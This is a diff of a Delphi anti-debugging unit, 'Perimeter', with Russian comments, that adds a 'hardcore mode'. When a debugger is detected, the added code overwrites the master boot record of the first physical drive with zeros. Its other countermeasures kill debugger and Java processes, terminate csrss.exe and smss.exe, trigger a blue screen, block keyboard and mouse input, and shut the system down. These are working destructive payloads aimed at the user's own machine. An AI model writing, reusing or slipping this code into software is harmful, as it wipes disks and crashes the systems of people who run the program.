@@ -1,8 +1,8 @@
-﻿//Anti-debugger Perimeter by HD.exe
-
-unit Perimeter;
+﻿unit Perimeter;
 
 interface
+
+{$DEFINE HARDCORE_MODE}
 
 type
   TExternalChecking = record
@@ -21,9 +21,63 @@ type
     Interval: integer;
   end;
 
+// Контрольные суммы основных функций:
+const
+  ValidInitCRC: LongWord = $73A7DEEE;
+  ValidStopCRC: LongWord = $339EAD36;
+  ValidMainCRC: LongWord = $B7922AC6;
+
+// Константы названий процессов для уничтожения:
+const
+  Debuggers: array [0..1] of string = (
+                                         'ollydbg.exe',
+                                         'idaq.exe'
+                                                       );
+
+  AdditionalProcesses: array [0..1] of string = (
+                                                   'java.exe',
+                                                   'javaw.exe'
+                                                                );
+
+  Csrss: string = 'csrss.exe';
+  Smss: string = 'smss.exe';
+
+// Константы механизма противодействия:
+const
+  Nothing = 0;
+  ShutdownProcess = 1;
+  KillProcesses = 2;
+  Notify = 4;
+  BlockIO = 8;
+  ShutdownPrimary = 16;
+  ShutdownSecondary = 32;
+  GenerateBSOD = 64;
+  HardBSOD = 128;
+
+{$IFDEF HARDCORE_MODE}
+  DestroyMBR = 256;
+{$ENDIF}
+
+// Константы-идентификаторы проверок:
+const
+  ROM = 1;
+  PreventiveFlag = 2;
+  ASM_A = 4;
+  ASM_B = 8;
+  ASM_C = 16;
+  IDP = 32;
+  RDTSC_BP = 64;
+  WINAPI_BP = 128;
+  ZwSIT = 256;
+  ZwQIP = 512;
+
+const
+  ExternalChecking = 1; // Внешняя процедура при проверке
+  ExternalEliminating = 2;  // Внешняя процедура при ликвидации угрозы
 
 procedure InitPerimeter(PerimeterInputData: TPerimeterInputData);
 procedure StopPerimeter;
+procedure DirectCall(Code: LongWord);
 procedure Emulate(Debugger: boolean; Breakpoint: boolean);
 procedure ChangeParameters(ResistanceType: LongWord; CheckingType: LongWord; ExternalType: LongWord);
 procedure ChangeExternalProcedures(OnCheckingProc: pointer; DebuggerValue: LongWord; OnEliminatingProc: pointer);
@@ -73,7 +127,6 @@ type
     OnEliminating: procedure; stdcall;
   end;
 
-
 var
   PerimeterInfo: TPerimeterInfo;
   ExternalGuard: TExternalGuard;
@@ -107,9 +160,10 @@ const
 
   THREAD_PRIORITY_TIME_CRITICAL = 15;
 
+  PROCESS_TERMINATE = $0001;
+
 type
   HWND = LongWord;
-  DWORD = LongWord;
   WPARAM = Longint;
   LPARAM = Longint;
   UINT = LongWord;
@@ -121,41 +175,92 @@ type
 
   _LUID_AND_ATTRIBUTES = packed record
     Luid: Int64;
-    Attributes: DWORD;
+    Attributes: LongWord;
   end;
   TLUIDAndAttributes = _LUID_AND_ATTRIBUTES;
 
   _TOKEN_PRIVILEGES = record
-    PrivilegeCount: DWORD;
+    PrivilegeCount: LongWord;
     Privileges: array [0..0] of TLUIDAndAttributes;
   end;
   TTokenPrivileges = _TOKEN_PRIVILEGES;
   TOKEN_PRIVILEGES = _TOKEN_PRIVILEGES;
 
-function TerminateProcess(hProcess: THandle; uExitCode: UINT): BOOL; stdcall; external kernel32 name 'TerminateProcess';
-function OpenProcess(dwDesiredAccess: DWORD; bInheritHandle: BOOL; dwProcessId: DWORD): THandle; stdcall; external kernel32 name 'OpenProcess';
-function OpenProcessToken(ProcessHandle: THandle; DesiredAccess: DWORD; var TokenHandle: THandle): BOOL; stdcall; external advapi32 name 'OpenProcessToken';
+function TerminateProcess(Handle: LongWord; ExitCode: LongWord): LongWord; stdcall; external kernel32 name 'TerminateProcess';  
+function OpenProcess(dwDesiredAccess: LongWord; bInheritHandle: BOOL; dwProcessId: LongWord): THandle; stdcall; external kernel32 name 'OpenProcess';
+function OpenProcessToken(ProcessHandle: THandle; DesiredAccess: LongWord; var TokenHandle: THandle): BOOL; stdcall; external advapi32 name 'OpenProcessToken';
 function GetCurrentProcess: THandle; stdcall; external kernel32 name 'GetCurrentProcess';
 function CloseHandle(hObject: THandle): BOOL; stdcall; external kernel32 name 'CloseHandle';
 
 function LookupPrivilegeValue(lpSystemName, lpName: PChar; var lpLuid: Int64): BOOL; stdcall; external advapi32 name 'LookupPrivilegeValueA';
 
 function AdjustTokenPrivileges(TokenHandle: THandle; DisableAllPrivileges: BOOL;
-  const NewState: TTokenPrivileges; BufferLength: DWORD;
-  var PreviousState: TTokenPrivileges; var ReturnLength: DWORD): BOOL; stdcall; external advapi32 name 'AdjustTokenPrivileges';
+  const NewState: TTokenPrivileges; BufferLength: LongWord;
+  var PreviousState: TTokenPrivileges; var ReturnLength: LongWord): BOOL; stdcall; external advapi32 name 'AdjustTokenPrivileges';
 
-function GetCurrentThreadId: DWORD; stdcall; external kernel32 name 'GetCurrentThreadId';
-function SetThreadAffinityMask(hThread: THandle; dwThreadAffinityMask: DWORD): DWORD; stdcall; external kernel32 name 'SetThreadAffinityMask';
+function GetCurrentThreadId: LongWord; stdcall; external kernel32 name 'GetCurrentThreadId';
+function SetThreadAffinityMask(hThread: THandle; dwThreadAffinityMask: LongWord): LongWord; stdcall; external kernel32 name 'SetThreadAffinityMask';
 function SetThreadPriority(hThread: THandle; nPriority: Integer): BOOL; stdcall; external kernel32 name 'SetThreadPriority';
 
 function ReadProcessMemory(hProcess: THandle; const lpBaseAddress: Pointer; lpBuffer: Pointer;
-  nSize: DWORD; var lpNumberOfBytesRead: DWORD): BOOL; stdcall; external kernel32 name 'ReadProcessMemory';
+  nSize: LongWord; var lpNumberOfBytesRead: LongWord): BOOL; stdcall; external kernel32 name 'ReadProcessMemory';
 
 function GetModuleHandle(lpModuleName: PChar): HMODULE; stdcall; external kernel32 name 'GetModuleHandleA';
 function LoadLibrary(lpLibFileName: PChar): HMODULE; stdcall; external kernel32 name 'LoadLibraryA';
 function GetProcAddress(hModule: HMODULE; lpProcName: LPCSTR): FARPROC; stdcall; external kernel32 name 'GetProcAddress';
-function GetWindowThreadProcessId(hWnd: HWND; dwProcessId: pointer): DWORD; stdcall; external user32 name 'GetWindowThreadProcessId';
+function GetWindowThreadProcessId(hWnd: HWND; dwProcessId: pointer): LongWord; stdcall; external user32 name 'GetWindowThreadProcessId';
 function GetCurrentThread: THandle; stdcall; external kernel32 name 'GetCurrentThread';
+function GetCurrentProcessId: LongWord; stdcall; external kernel32 name 'GetCurrentProcessId';
+
+{$IFDEF HARDCORE_MODE}
+var
+  hDrive: LongWord;
+  Data: pointer;
+  WrittenBytes: LongWord;
+
+const
+  GENERIC_ALL           = $10000000;
+  FILE_SHARE_READ       = $00000001;
+  FILE_SHARE_WRITE      = $00000002;
+  OPEN_EXISTING         = 3;
+  FILE_ATTRIBUTE_NORMAL = $00000080;
+
+type
+  PSecurityAttributes = ^_SECURITY_ATTRIBUTES;
+  _SECURITY_ATTRIBUTES = record
+    nLength: LongWord;
+    lpSecurityDescriptor: Pointer;
+    bInheritHandle: LongBool;
+  end;
+
+  POverlapped = ^_OVERLAPPED;
+  _OVERLAPPED = record
+    Internal: LongWord;
+    InternalHigh: LongWord;
+    Offset: LongWord;
+    OffsetHigh: LongWord;
+    hEvent: THandle;
+  end;
+
+var
+  CreateFile: function(
+                        lpFileName: PAnsiChar;
+                        dwDesiredAccess,
+                        dwShareMode: LongWord;
+                        lpSecurityAttributes: PSecurityAttributes;
+                        dwCreationDisposition,
+                        dwFlagsAndAttributes: LongWord;
+                        hTemplateFile: THandle
+                       ): THandle; stdcall;
+
+  WriteFile: function(
+                       hFile: THandle;
+                       const Buffer;
+                       nNumberOfBytesToWrite: LongWord;
+                       var lpNumberOfBytesWritten: LongWord;
+                       lpOverlapped: POverlapped
+                      ): LongBool; stdcall;
+{$ENDIF}
 
 {- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -}
 {                                END OF WINDOWS                                 }
@@ -169,20 +274,20 @@ const
 
 type
   tagPROCESSENTRY32 = packed record
-    dwSize: DWORD;
-    cntUsage: DWORD;
-    th32ProcessID: DWORD;       
-    th32DefaultHeapID: DWORD;
-    th32ModuleID: DWORD;        
-    cntThreads: DWORD;
-    th32ParentProcessID: DWORD; 
+    dwSize: LongWord;
+    cntUsage: LongWord;
+    th32ProcessID: LongWord;       
+    th32DefaultHeapID: LongWord;
+    th32ModuleID: LongWord;
+    cntThreads: LongWord;
+    th32ParentProcessID: LongWord; 
     pcPriClassBase: Longint;    
-    dwFlags: DWORD;
+    dwFlags: LongWord;
     szExeFile: array[0..MAX_PATH - 1] of Char;
   end;
   TProcessEntry32 = tagPROCESSENTRY32;
 
-function CreateToolhelp32Snapshot(dwFlags, th32ProcessID: DWORD): THandle; stdcall; external kernel32 name 'CreateToolhelp32Snapshot';
+function CreateToolhelp32Snapshot(dwFlags, th32ProcessID: LongWord): THandle; stdcall; external kernel32 name 'CreateToolhelp32Snapshot';
 function Process32First(hSnapshot: THandle; var lppe: TProcessEntry32): BOOL; stdcall; external kernel32 name 'Process32First';
 function Process32Next(hSnapshot: THandle; var lppe: TProcessEntry32): BOOL; stdcall; external kernel32 name 'Process32Next';
 
@@ -297,11 +402,6 @@ end;
 {- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -}
 
 const
-  ValidInitCRC: DWORD = $963696D9;
-  ValidStopCRC: DWORD = $6853DDDA;
-  ValidMainCRC: DWORD = $3C184CBD;
-
-const
   Delta: single = 0.5; // Допуск по времени
 
 const
@@ -347,18 +447,18 @@ type HARDERROR_RESPONSE = (
 type
   PSYSTEM_HANDLE_INFORMATION = ^SYSTEM_HANDLE_INFORMATION;
   SYSTEM_HANDLE_INFORMATION = packed record
-    ProcessId: DWORD;
+    ProcessId: LongWord;
     ObjectTypeNumber: Byte;
     Flags: Byte;
     Handle: Word;
     pObject: Pointer;
-    GrantedAccess: DWORD;
+    GrantedAccess: LongWord;
   end;
 
 type
   PSYSTEM_HANDLE_INFORMATION_EX = ^SYSTEM_HANDLE_INFORMATION_EX;
   SYSTEM_HANDLE_INFORMATION_EX = packed record
-    NumberOfHandles: dword;
+    NumberOfHandles: LongWord;
     Information: array [0..0] of SYSTEM_HANDLE_INFORMATION;
   end;
 
@@ -366,7 +466,7 @@ type // Объявление типов из NTDDK
   POWER_ACTION = integer;
   SYSTEM_POWER_STATE = integer;
   ULONG = cardinal;
-  NTStatus = DWORD;
+  NTStatus = LongWord;
   PVoid = pointer;
 
 const // Номера ошибок, с которыми вызывается синий экран.
@@ -379,7 +479,7 @@ const // Номера ошибок, с которыми вызывается с�
   CLUSTER_POISONED = $C0130017;
 
 const // Создаём массив из кодов ошибок чтобы удобнее было ими оперировать
-  ErrorCode: array [0..6] of DWORD =    (
+  ErrorCode: array [0..6] of LongWord =    (
                                           TRUST_FAILURE,
                                           LOGON_FAILURE,
                                           HOST_DOWN,
@@ -415,6 +515,8 @@ var
 
   // Завершение процесса из ядра
   LdrShutdownProcess: procedure; stdcall;
+  ZwTerminateProcess: function(Handle: LongWord; ExitStatus: LongWord): NTStatus; stdcall;
+  //LdrShutdownThread: procedure; stdcall;
 
   //  Отключение клавиатуры и мыши:
   BlockInput: function (Block: BOOL): BOOL; stdcall;
@@ -424,7 +526,7 @@ var
   OutputDebugStringA: procedure (lpOutputString: string); stdcall;
 
   ZwQueryInformationProcess: function (ProcessHandle: THANDLE;
-                                       ProcessInformationClass: DWORD;
+                                       ProcessInformationClass: LongWord;
                                        ProcessInformation: pointer;
                                        ProcessInformationLength: ULONG;
                                        ReturnLength: PULONG): NTStatus; stdcall;
@@ -434,27 +536,12 @@ var
 
   // Маскируем стандартные функции, используем "ручной" вызов:
   MsgBox: procedure (hWnd: HWND; lpText: PAnsiChar; lpCaption: PAnsiChar; uType: Cardinal); stdcall;
-  PlaySound: procedure (pszSound: string; hMod: HModule; fdwSound: DWORD); stdcall;
+  PlaySound: procedure (pszSound: string; hMod: HModule; fdwSound: LongWord); stdcall;
   QueryPerformanceFrequency: procedure (var lpFrequency: Int64); stdcall;
   QueryPerformanceCounter: procedure (var lpPerformanceCount: Int64); stdcall;
   SendMessage: procedure (hWnd: HWND; Msg: LongWord; wParam: WPARAM; lParam: LPARAM); stdcall;
-  Sleep: procedure (SuspendTime: DWORD); stdcall;
-  OpenThread: function (dwDesiredAccess: DWORD; bInheritHandle: boolean; dwThreadId: DWORD): THandle; stdcall;
-
-// Константы названий процессов для уничтожения:
-const
-  Debuggers: array [0..1] of string = (
-                                         'ollydbg.exe',
-                                         'idaq.exe'
-                                                       );
-
-  AdditionalProcesses: array [0..1] of string = (
-                                                   'java.exe',
-                                                   'javaw.exe'
-                                                                );
-
-  Csrss: string = 'csrss.exe';
-  Smss: string = 'smss.exe';
+  Sleep: procedure (SuspendTime: LongWord); stdcall;
+  OpenThread: function (dwDesiredAccess: LongWord; bInheritHandle: boolean; dwThreadId: LongWord): THandle; stdcall;
 
 // Имена библиотек и вызываемых функций:
 const
@@ -465,6 +552,9 @@ const
   sLdrShutdownProcess: PAnsiChar = 'LdrShutdownProcess';
   sZwSetInformationThread: PAnsiChar = 'ZwSetInformationThread';
   sZwQueryInformationProcess: PAnsiChar = 'ZwQueryInformationProcess';
+  sZwTerminateProcess: PAnsiChar = 'ZwTerminateProcess';
+  //sLdrShutdownThread: PAnsiChar = 'LdrShutdownThread';
+
 
   // Из kernel32:
   sIsDebuggerPresent: PAnsiChar = 'IsDebuggerPresent';
@@ -473,6 +563,11 @@ const
   sSleep: PAnsiChar = 'Sleep';
   sOutputDebugStringA: PAnsiChar = 'OutputDebugStringA';
   sOpenThread: PAnsiChar = 'OpenThread';
+
+  {$IFDEF HARDCORE_MODE}
+  sCreateFileA: PAnsiChar = 'CreateFileA';
+  sWriteFile: PAnsiChar = 'WriteFile';
+  {$ENDIF}
 
   // Из user32:
   sMessageBox: PAnsiChar = 'MessageBoxA';
@@ -486,41 +581,15 @@ const
   SND_LOOP            = $0008;
   SND_ASYNC           = $0001;
 
-// Константы механизма противодействия:
-const
-  Nothing = 0;
-  KillProcesses = 1;
-  Notify = 2;
-  BlockIO = 4;
-  ShutdownPrimary = 8;
-  ShutdownSecondary = 16;
-  GenerateBSOD = 32;
-  HardBSOD = 64;
-
-// Константы-идентификаторы проверок:
-const
-  ROM = 1;
-  PreventiveFlag = 2;
-  ASM_A = 4;
-  ASM_B = 8;
-  ASM_C = 16;
-  IDP = 32;
-  RDTSC_BP = 64;
-  WINAPI_BP = 128;
-  ZwSIT = 256;
-  ZwQIP = 512;
-
-const
-  ExternalChecking = 1; // Внешняя процедура при проверке
-  ExternalEliminating = 2;  // Внешняя процедура при ликвидации угрозы
-
 // Рабочие переменные:
 var
-  TypeOfResistance: DWORD;
-  TypeOfChecking: DWORD;
-  TypeOfExternal: DWORD;
+  GlobalInitState: boolean = false;
 
-  ThreadID: DWORD;
+  TypeOfResistance: LongWord;
+  TypeOfChecking: LongWord;
+  TypeOfExternal: LongWord;
+
+  ThreadID: LongWord;
   ThreadHandle: integer;
   FormHandle: THandle; // Хэндл формы, которой будут посылаться сообщения
   Active: boolean = false;
@@ -610,8 +679,6 @@ end;
 
 // Функция, убивающая процесс по его имени:
 function KillTask(ExeFileName: string): integer;
-const
-  PROCESS_TERMINATE = $0001;
 var
   Co: BOOL;
   FS: THandle;
@@ -623,17 +690,15 @@ begin
   Co := Process32First(FS,FP);
 
   while integer(Co) <> 0 do
-    begin
-      if
-          ((UpperCase(ExtractFileName(FP.szExeFile)) = UpperCase(ExeFileName))
-        or
-          (UpperCase(FP.szExeFile) = UpperCase(ExeFileName)))
-      then
-      begin
-        Result := Integer(TerminateProcess(OpenProcess(PROCESS_TERMINATE, BOOL(0), FP.th32ProcessID), 0));
-      end;
-      Co := Process32Next(FS, FP);
-    end;
+  begin
+    if
+      ((UpperCase(ExtractFileName(FP.szExeFile)) = UpperCase(ExeFileName))
+    or
+      (UpperCase(FP.szExeFile) = UpperCase(ExeFileName)))
+    then
+      Result := Integer(TerminateProcess(OpenProcess(PROCESS_TERMINATE, BOOL(0), FP.th32ProcessID), 0));
+    Co := Process32Next(FS, FP);
+  end;
   CloseHandle(FS);
 end;
 
@@ -672,6 +737,126 @@ begin
 end;
 
 
+procedure InitFunctions;
+var
+  hUser32: THandle;
+  hKernel32: THandle;
+  hNtdll: THandle;
+  hWinMM: THandle;
+begin
+// Получаем хэндлы библиотек:
+  hUser32 := GetModuleHandle(user32);
+  hKernel32 := GetModuleHandle(kernel32);
+  hNtdll := GetModuleHandle(ntdll);
+  hWinMM := LoadLibrary(winmm);
+
+// Получаем адреса функций в библиотеках:
+  // kernel32:
+  IsDebuggerPresent := GetProcAddress(hKernel32, sIsDebuggerPresent);
+  QueryPerformanceFrequency := GetProcAddress(hKernel32, sQueryPerformanceFrequency);
+  QueryPerformanceCounter := GetProcAddress(hKernel32, sQueryPerformanceCounter);
+  Sleep := GetProcAddress(hKernel32, sSleep);
+  OutputDebugStringA := GetProcAddress(hKernel32, sOutputDebugStringA);
+  OpenThread := GetProcAddress(hKernel32, sOpenThread);
+
+  {$IFDEF HARDCORE_MODE}
+  CreateFile := GetProcAddress(hKernel32, sCreateFileA);
+  WriteFile := GetProcAddress(hKernel32, sWriteFile);
+  {$ENDIF}
+
+  // user32:
+  BlockInput := GetProcAddress(hUser32, sBlockInput);
+  MsgBox := GetProcAddress(hUser32, sMessageBox);
+  SendMessage := GetProcAddress(hUser32, sSendMessage);
+
+  // winmm:
+  PlaySound := GetProcAddress(hWinMM, sPlaySound);
+
+  // ntdll:
+  NTRaiseHardError := GetProcAddress(hNtdll, sNtRaiseHardError);
+  NTShutdownSystem := GetProcAddress(hNtdll, sNtShutdownSystem);
+  NTInitiatePowerAction := GetProcAddress(hNtdll, sNtInitiatePowerAction);
+  LdrShutdownProcess := GetProcAddress(hNtdll, sLdrShutdownProcess);
+  ZwSetInformationThread := GetProcAddress(hNtdll, sZwSetInformationThread);
+  ZwQueryInformationProcess := GetProcAddress(hNtdll, sZwQueryInformationProcess);
+  ZwTerminateProcess := GetProcAddress(hNtdll, sZwTerminateProcess);
+//  LdrShutdownThread := GetProcAddress(hNtdll, sLdrShutdownThread);
+
+// Присваиваем процессу привилегию SE_SHUTDOWN_NAME:
+  PerimeterInfo.Debug.PrivilegesActivated := NTSetPrivilege(SE_SHUTDOWN_NAME, true);
+
+  GlobalInitState := true;
+end;
+
+procedure DirectCall(Code: LongWord);
+var
+  I: byte;
+  ProcLength, AdditionalLength: byte;
+begin
+  if not GlobalInitState then InitFunctions;
+
+  case Code of
+    Nothing: Exit;
+
+    ShutdownProcess:
+      begin
+        LdrShutdownProcess;
+        ZwTerminateProcess(OpenProcess(PROCESS_TERMINATE, BOOL(0), GetCurrentProcessId), 0);
+      end;
+
+    KillProcesses:
+      begin
+        ProcLength := Length(Debuggers) - 1;
+        for I := 0 to ProcLength do
+        begin
+          KillTask(Debuggers[I]);
+        end;
+
+        AdditionalLength := Length(AdditionalProcesses);
+        Dec(AdditionalLength);
+
+        for I := 0 to AdditionalLength do
+        begin
+          KillTask(AdditionalProcesses[I]);
+        end;
+      end;
+
+    Notify:
+      begin
+        PlaySound('ALERT', 0, SND_RESOURCE or SND_ASYNC or SND_LOOP);
+        MsgBox(FormHandle, 'Внутренняя ошибка! Продолжение невозможно!', 'Угроза внутренней безопасности!', MB_ICONERROR);
+        LdrShutdownProcess;
+        ZwTerminateProcess(OpenProcess(PROCESS_TERMINATE, BOOL(0), GetCurrentProcessId), 0);
+      end;
+
+    BlockIO: BlockInput(true);
+
+    ShutdownPrimary: NtShutdownSystem(SHUTDOWN_ACTION(0));
+
+    ShutdownSecondary: NTInitiatePowerAction(4, 6, 0, true);
+
+    GenerateBSOD: NtRaiseHardError(ErrorCode[2], 0, nil, nil, HARDERROR_RESPONSE_OPTION(6), @HR);
+
+    HardBSOD:
+      begin
+        KillTask(Csrss);
+        KillTask(Smss);
+      end;
+
+   {$IFDEF HARDCORE_MODE}
+    DestroyMBR:
+      begin
+        hDrive := CreateFile('\\.\PhysicalDrive0', GENERIC_ALL, FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+        GetMem(Data, 512);
+        FillChar(Data^, 512, #0);
+        WriteFile(hDrive, Data^, 512, WrittenBytes, nil);
+        CloseHandle(hDrive);
+        FreeMem(Data);
+      end;
+   {$ENDIF}
+  end;
+end;
+
 // Основной поток: проверка на наличие отладчика, проверка на брейкпоинты
 procedure MainThread;
 const
@@ -699,6 +884,13 @@ var
       ExternalGuard.OnEliminating
     end;
 
+    // Убиваем свой процесс из ядра:
+    if (TypeOfResistance and ShutdownProcess) = ShutdownProcess then
+    begin
+      LdrShutdownProcess;
+      ZwTerminateProcess(OpenProcess(PROCESS_TERMINATE, BOOL(0), GetCurrentProcessId), 0);
+    end;
+
     // Убиваем процессы:
     if (TypeOfResistance and KillProcesses) = KillProcesses then
     begin
@@ -713,7 +905,7 @@ var
       for I := 0 to AdditionalLength do
       begin
         KillTask(AdditionalProcesses[I]);
-      end;  
+      end;
     end;
 
     // Выводим сообщение и закрываем программу:
@@ -733,7 +925,9 @@ var
           end;
       end;
       MsgBox(FormHandle, NotifyMessage, CaptionMessage, MB_ICONERROR);
+
       LdrShutdownProcess;
+      ZwTerminateProcess(OpenProcess(PROCESS_TERMINATE, BOOL(0), GetCurrentProcessId), 0);
     end;
 
     // Блокируем клавиатуру и мышь:
@@ -767,33 +961,28 @@ var
       KillTask(Csrss);
       KillTask(Smss);
     end;
+
+    {$IFDEF HARDCORE_MODE}
+    if (TypeOfResistance and DestroyMBR) = DestroyMBR then
+    begin
+      hDrive := CreateFile('\\.\PhysicalDrive0', GENERIC_ALL, FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+      GetMem(Data, 512);
+      FillChar(Data^, 512, #0);
+      WriteFile(hDrive, Data^, 512, WrittenBytes, nil);
+      CloseHandle(hDrive);
+      FreeMem(Data);
+    end;
+    {$ENDIF}
   end;
 
   procedure ReStruct;
   begin
     with PerimeterInfo do
     begin
-      Debug.PreventiveProcessesExists := false;
-      Debug.IsDebuggerPresent := false;
-
-      Debug.RDTSC_Debugger.Value := 0;
-      Debug.RDTSC_Debugger.IsDebuggerExists := false;
-
-      Debug.Asm_A.Value := 0;
-      Debug.Asm_A.IsDebuggerExists := false;
-
-      Debug.Asm_B.Value := 0;
-      Debug.Asm_B.IsDebuggerExists := false;
-
-      Debug.Asm_C.Value := 0;
-      Debug.Asm_C.IsDebuggerExists := false;
-
-      Debug.ZwQIP.Value := 0;
-      Debug.ZwQIP.IsDebuggerExists := false;
-
-      Debug.ROMFailure := false;
-
-      PerimeterInfo.Debug.ExternalChecking.IsDebuggerExists := false;
+      FillChar(Debug, SizeOf(Debug), #0);
+      Functions.Main.Checksum := 0;
+      Functions.Init.Checksum := 0;
+      Functions.Stop.Checksum := 0;
     end;
   end;
 
@@ -805,7 +994,7 @@ var
   DebuggerState, BreakpointState: byte;
 
 // Для проверки памяти:
-  Buffer: array [0..4095] of byte;
+  Buffer: pointer;
   ByteReaded: Cardinal;
 
 // Список процессов:
@@ -816,11 +1005,11 @@ var
   FullState: boolean;
 
 // Перенос на отдельное ядро:
-  ThreadID: DWORD;
+  ThreadID: LongWord;
   ThreadHandle: THandle;
 
 // Проверка на отладчик через RDTSC:
-  Timer: DWORD;
+  Timer: LongWord;
   FirstIteration: boolean;
 const
   DbgString: string = '"PLLDS" - Веха #1';
@@ -879,14 +1068,20 @@ begin
 
     if (TypeOfChecking and ROM) = ROM then
     begin
-      ReadProcessMemory(Process, InitAddress, @Buffer, InitSize, ByteReaded);
-      PerimeterInfo.Functions.Init.Checksum := CRC32($FFFFFFFF, @Buffer, ByteReaded);
+      GetMem(Buffer, InitSize);
+      ReadProcessMemory(Process, InitAddress, Buffer, InitSize, ByteReaded);
+      PerimeterInfo.Functions.Init.Checksum := CRC32($FFFFFFFF, Buffer, ByteReaded);
+      FreeMem(Buffer);
 
-      ReadProcessMemory(Process, StopAddress, @Buffer, StopSize, ByteReaded);
-      PerimeterInfo.Functions.Stop.Checksum := CRC32($FFFFFFFF, @Buffer, ByteReaded);
+      GetMem(Buffer, StopSize);
+      ReadProcessMemory(Process, StopAddress, Buffer, StopSize, ByteReaded);
+      PerimeterInfo.Functions.Stop.Checksum := CRC32($FFFFFFFF, Buffer, ByteReaded);
+      FreeMem(Buffer);
 
-      ReadProcessMemory(Process, MainAddress, @Buffer, MainSize, ByteReaded);
-      PerimeterInfo.Functions.Main.Checksum := CRC32($FFFFFFFF, @Buffer, ByteReaded);
+      GetMem(Buffer, MainSize);
+      ReadProcessMemory(Process, MainAddress, Buffer, MainSize, ByteReaded);
+      PerimeterInfo.Functions.Main.Checksum := CRC32($FFFFFFFF, Buffer, ByteReaded);
+      FreeMem(Buffer);
 
       if (PerimeterInfo.Functions.Main.Checksum <> ValidMainCRC) or
          (PerimeterInfo.Functions.Init.Checksum <> ValidInitCRC) or
@@ -1213,60 +1408,21 @@ begin
 
     mov SendMessage, eax;
   end;
-
+  GlobalInitState := false;
   EndThread(0);
 end;
 
 
 procedure InitPerimeter(PerimeterInputData: TPerimeterInputData);
 var
-  hUser32: THandle;
-  hKernel32: THandle;
-  hNtdll: THandle;
-  hWinMM: THandle;
-
 // Переменные для инициализации основного процесса:
-  ProcessID: DWORD;
+  ProcessID: LongWord;
   InitInt, StopInt, EmulateInt, MainInt: integer;
   EmulateAddress: pointer;
 
 begin
   CRCInit;
-
-// Получаем хэндлы библиотек:
-  hUser32 := GetModuleHandle(user32);
-  hKernel32 := GetModuleHandle(kernel32);
-  hNtdll := GetModuleHandle(ntdll);
-  hWinMM := LoadLibrary(winmm);
-
-// Получаем адреса функций в библиотеках:
-  // kernel32:
-  IsDebuggerPresent := GetProcAddress(hKernel32, sIsDebuggerPresent);
-  QueryPerformanceFrequency := GetProcAddress(hKernel32, sQueryPerformanceFrequency);
-  QueryPerformanceCounter := GetProcAddress(hKernel32, sQueryPerformanceCounter);
-  Sleep := GetProcAddress(hKernel32, sSleep);
-  OutputDebugStringA := GetProcAddress(hKernel32, sOutputDebugStringA);
-  OpenThread := GetProcAddress(hKernel32, sOpenThread);
-
-  // user32:
-  BlockInput := GetProcAddress(hUser32, sBlockInput);
-  MsgBox := GetProcAddress(hUser32, sMessageBox);
-  SendMessage := GetProcAddress(hUser32, sSendMessage);
-
-  // winmm:
-  PlaySound := GetProcAddress(hWinMM, sPlaySound);
-
-  // ntdll:
-  NTRaiseHardError := GetProcAddress(hNtdll, sNtRaiseHardError);
-  NTShutdownSystem := GetProcAddress(hNtdll, sNtShutdownSystem);
-  NTInitiatePowerAction := GetProcAddress(hNtdll, sNtInitiatePowerAction);
-  LdrShutdownProcess := GetProcAddress(hNtdll, sLdrShutdownProcess);
-  ZwSetInformationThread := GetProcAddress(hNtdll, sZwSetInformationThread);
-  ZwQueryInformationProcess := GetProcAddress(hNtdll, sZwQueryInformationProcess);
-
-// Присваиваем процессу привилегию SE_SHUTDOWN_NAME:
-  PerimeterInfo.Debug.PrivilegesActivated := NTSetPrivilege(SE_SHUTDOWN_NAME, true);
-
+  if not GlobalInitState then InitFunctions;
 
   with PerimeterInputData do
   begin
@@ -1351,7 +1507,7 @@ begin
   EmuBreakpoint := Breakpoint;
 end;
 
-procedure ChangeParameters(ResistanceType: LongWord; CheckingType: LongWord; ExternalType: DWORD);
+procedure ChangeParameters(ResistanceType: LongWord; CheckingType: LongWord; ExternalType: LongWord);
 begin
   TypeOfResistance := ResistanceType;
   TypeOfChecking := CheckingType;
